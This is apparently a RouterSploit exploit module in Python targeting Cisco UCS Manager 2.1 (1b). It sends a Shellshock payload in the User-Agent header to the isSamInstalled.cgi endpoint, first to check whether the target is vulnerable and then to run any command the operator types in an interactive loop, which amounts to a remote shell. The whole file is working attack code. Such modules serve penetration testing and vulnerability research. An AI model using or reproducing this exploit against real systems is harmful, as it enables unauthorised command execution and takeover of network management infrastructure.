import requests
import re

from routersploit import *


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Cisco UCS Manager 2.1 (1b) Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands on operating system level.
    """
    __info__ = {
        'name': 'Cisco UCS Manager RCE',
        'description': 'Module exploits Cisco UCS Manager 2.1 (1b) Remote Code Execution vulnerability which allows executing commands on operating system level.',
        'authors': [
            'thatchriseckert', # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>', # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/39568/',
            'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140926-bash',
        ],
        'targets': [
            'Cisco UCS Manager 2.1 (1b)',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1')
    port = exploits.Option(80, 'Target Port')

    def run(self):
        if self.check() == True:
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            self.command_loop()
        else:
            print_error("Target is not vulnerable")

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")
            print self.execute(cmd)

    def execute(self, cmd):
        url = sanitize_url("{}:{}/ucsm/isSamInstalled.cgi".format(self.target, self.port))
        headers = {
            "User-Agent": '() { test;};echo \"Content-type: text/plain\"; echo; echo; echo ffffffffffffffff; echo "$(%s)"; echo ffffffffffffffff;' % cmd
        }

        try:
            r = requests.get(url, headers=headers, verify=False)
            res = r.text
        except requests.exceptions.MissingSchema:
            return "Invalid URL format: %s" % url
        except requests.exceptions.ConnectionError:
            return "Connection error: %s" % url

        if 'ffffffffffffffff' in res:
            res = re.findall("ffffffffffffffff(|.+?)ffffffffffffffff", res, re.DOTALL)
            if len(res):
                return res[0]

        return False

    def check(self):
        # meaby random mark should be implemented
        url = sanitize_url("{}:{}/ucsm/isSamInstalled.cgi".format(self.target, self.port))
        headers = {
            "User-Agent": '() { test;};echo \"Content-type: text/plain\"; echo; echo; echo 9fdbd928b52c1ef61615a6fd2e8b49af;'
        }

        try:
            r = requests.get(url, headers=headers, verify=False)
            res = r.text
        except:
            return None

        if "9fdbd928b52c1ef61615a6fd2e8b49af" in res:
            return True

        return False

